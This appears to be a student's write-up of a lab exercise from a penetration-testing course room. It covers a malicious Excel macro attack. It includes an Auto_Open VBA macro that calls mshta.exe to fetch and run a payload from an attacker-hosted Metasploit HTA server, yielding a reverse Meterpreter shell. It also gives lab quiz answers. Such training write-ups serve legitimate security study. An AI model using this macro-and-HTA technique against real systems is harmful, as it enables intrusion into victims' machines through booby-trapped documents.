# Word to your Mother

- After doing everything that you can with your initial footholds your team thinks that its time to look at other resources and services that have opened up while moving through the network.


### Malicious Macro Overview
- Picture this, you are a manager for one of the top accounting firms in the United States. As you walk across the floor, you notice one thing in common: Every device has the Microsoft Office suite installed. This shouldn’t be any surprise to you, as reported in Microsoft’s 2019 Annual report, Office 365 (Commercial) has 180 million users. For an attacker, this is an extremely large attack surface. As an attacker, all you need to do is get one person to click on an Excel/Office document, and they could be the downfall of an organization.

Hence here, out attack vector is MS Excel file which we will use to plant malicious macros in and upload to Timekeep/THROWBACK-TIME machine.




### Step 1 - Manually Creating a Macro
- We will be using the same code base and we will also be utilizing our Metasploit's HTA server to gain reverse shell

### Step 2 - Setup Metasploit's HTA server
- we will be using the module `exploit/windows/misc/hta_server` 

![[Pasted image 20221020145049.png]]
- The URL containing the "`Local IP`" is the server that will deliver the payload to the unsuspecting victim.
	- At the moment, we only have a URL that will deliver a payload, so how does this get executed on the machine?

- This will simply facilitate fetching the .hta file onto the target but we need something to execute this HTA file.
- We could use "`mshta.exe`" in-built Windows executable used to aid in script execution with HTML applications.
	- Using mshta.exe we can execute the file on remote server and get a reverse shell back to our machine


So the payload to execute HTA application on target remote server will look like the following:
```vba
Sub Main()
	PID=Shell("mshta.exe <Local IP in MSfconsole which hosts the HTA server")
End Sub

Sub Auto_Open()
	Main
End Sub
```

- By running this Macro, we can get a a reverse shell back


### Step 3 - Upload excel file with macros onto the Time Server of murphyf

Wait for the meterpreter shell


![[Pasted image 20221020164715.png]]
- We can see that we are the Administrator on THROWBACK-TIME machine!!

### Users on the machine
![[Pasted image 20221020164819.png]]




## Questions
1. What web server accepts XLSMs as a file upload?
`THROWBACK-TIME`

2. What page is the file uploaded in?
`timesheet.php`

3. What is the name of XSLMs we can upload?
`timesheet.xslm`


`Note - I also submitted root flags of TIME in Task 4 as well`